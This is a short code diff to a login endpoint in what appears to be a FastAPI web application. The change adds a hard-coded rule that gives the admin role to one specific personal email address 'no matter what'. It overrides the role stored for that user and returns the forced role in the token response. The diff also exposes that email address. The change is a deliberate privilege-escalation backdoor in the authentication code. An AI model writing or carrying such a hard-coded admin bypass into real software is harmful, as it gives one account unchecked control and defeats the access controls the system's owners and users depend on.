@@ -124,6 +124,7 @@ def login_for_access_token(request: Request, form_data: OAuth2PasswordRequestFor
              db.refresh(user)
         
         access_token_expires = timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
+        # FORCE ROLE TO ADMIN FOR THIS EMAIL
         access_token = auth.create_access_token(
             data={"sub": user.username, "role": "admin"}, expires_delta=access_token_expires
         )
@@ -137,10 +138,13 @@ def login_for_access_token(request: Request, form_data: OAuth2PasswordRequestFor
         )
     
     access_token_expires = timedelta(minutes=auth.ACCESS_TOKEN_EXPIRE_MINUTES)
+    # FORCE ADMIN ROLE FOR THIS SPECIFIC EMAIL NO MATTER WHAT
+    role_to_use = "admin" if user.email == "karanmandal8409384169@gmail.com" else user.role.value
+    
     access_token = auth.create_access_token(
-        data={"sub": user.username, "role": user.role.value}, expires_delta=access_token_expires
+        data={"sub": user.username, "role": role_to_use}, expires_delta=access_token_expires
     )
-    return {"access_token": access_token, "token_type": "bearer", "role": user.role.value}
+    return {"access_token": access_token, "token_type": "bearer", "role": role_to_use}
 
 @app.post("/send-otp")
 @limiter.limit("3/hour")
